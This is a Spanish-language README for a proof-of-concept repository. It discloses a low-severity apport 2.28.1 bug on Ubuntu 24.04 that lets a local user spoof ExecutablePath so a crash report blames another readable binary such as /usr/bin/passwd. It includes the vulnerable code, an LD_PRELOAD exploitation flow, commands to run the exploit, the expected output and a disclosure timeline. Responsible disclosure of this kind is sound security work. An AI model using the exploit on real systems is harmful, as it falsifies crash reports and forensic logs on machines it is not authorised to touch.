# Breach-Entry — Apport ExecutablePath Spoofing

Bug de integridad/metadata en **apport 2.28.1** (Ubuntu 24.04 LTS). El método `_check_interpreted()` confía en `argv[1]` del proceso crash para sobrescribir `ExecutablePath`, verificando solo legibilidad (`os.access(path, os.R_OK)`) sin confirmar autenticidad. Esto permite atribuir un crash a cualquier archivo legible del sistema.

**No es escalación de privilegios.** Todo el parsing crítico corre como el usuario del crash, no como root.

---

## Vulnerabilidad

- **CWE-20** / **CWE-345**: Improper Input Validation / Insufficient Verification of Data Authenticity
- **CVSS v3.1**: 5.5 (AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L)
- **Vector**: `report.py:_check_interpreted()` (líneas 626-633)

```python
if os.access(cmdargs[1], os.R_OK):
    self["InterpreterPath"] = self["ExecutablePath"]
    self["ExecutablePath"] = os.path.realpath(cmdargs[1])
```

## Exploitation Flow

```
LD_PRELOAD=.so /usr/bin/bash /usr/bin/passwd
  → SIGILL → apport hook → _check_interpreted()
  → bash coincide como intérprete
  → ExecutablePath = argv[1] = /usr/bin/passwd
  → Crash report: _usr_bin_passwd.{uid}.crash
```

### Requisitos

| Condición | Descripción |
|-----------|-------------|
| apport activo | `systemctl is-active apport.service` |
| Core dumps | `ulimit -c unlimited` |
| Nombre base del exe | Debe coincidir con patrón de intérprete (`bash`, `python*`, `perl*`, etc.) |
| argv[1] legible | El target debe ser legible por el usuario del crash |

## PoC Usage

```bash
git clone https://github.com/Ruby570bocadito/Breach-Entry.git
cd Breach-Entry
python3 exploit_apport.py                     # target: /usr/bin/passwd
python3 exploit_apport.py /usr/bin/su         # target personalizado
```

Salida esperada:
```
[+] Report: ExecutablePath: /usr/bin/passwd     → FALSE
[+] Report: InterpreterPath: /usr/bin/bash       → TRUE (the real crashed process)
```

## Archivos

| Archivo | Descripción |
|---------|-------------|
| `exploit_apport.py` | Exploit completo (Python, genera .so ELF64 sin gcc) |
| `poc_apport_override.py` | PoC básico (Python puro) |
| `pwn_apport.c` | PoC alternativo en C (requiere gcc + renombrar binario) |
| `security-advisory-apport-spoofing.md` | Reporte técnico detallado |
| `exploit_harness.c` | Harness de fuzzing kernel (15 tests) |
| `stress_race.c` | Race condition stress test (8 threads) |
| `uffd_race_poc.c` | userfaultfd + io_uring race PoC |
| `syz_runner.c` | Weighted kernel fuzzer |

## Disclosure Timeline

| Fecha | Evento |
|-------|--------|
| `2026-04-15` | Descubrimiento inicial |
| `2026-04-23` | PoC funcional |
| `2026-04-28` | Notificación a Ubuntu Security Team |
| `2026-04-29` | Solicitud de CVE |
| `2026-05-20` | Divulgación pública |

## Impacto

- Atribución falsa en crash reports y logs
- Contaminación de telemetría (Launchpad)
- DoS parcial en `/var/crash/`
- Confusión forense (core dumps atribuidos a binario incorrecto)

**Lo que NO permite:**
- Escalación de privilegios (LPE)
- Ejecución remota (RCE)
- Escritura fuera de `/var/crash/`
- Ejecución de hooks como root

## Referencias

- [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- [CWE-345: Insufficient Verification of Data Authenticity](https://cwe.mitre.org/data/definitions/345.html)
- [CVE-2019-15790](https://nvd.nist.gov/vuln/detail/CVE-2019-15790) — apport ExecutablePath path sanitization bypass
- [CVE-2020-11935](https://nvd.nist.gov/vuln/detail/CVE-2020-11935) — apport directory traversal via ExecutablePath
- [apport repository](https://git.launchpad.net/apport)

---

*© 2026 — Responsible Disclosure — Educational Purpose Only*
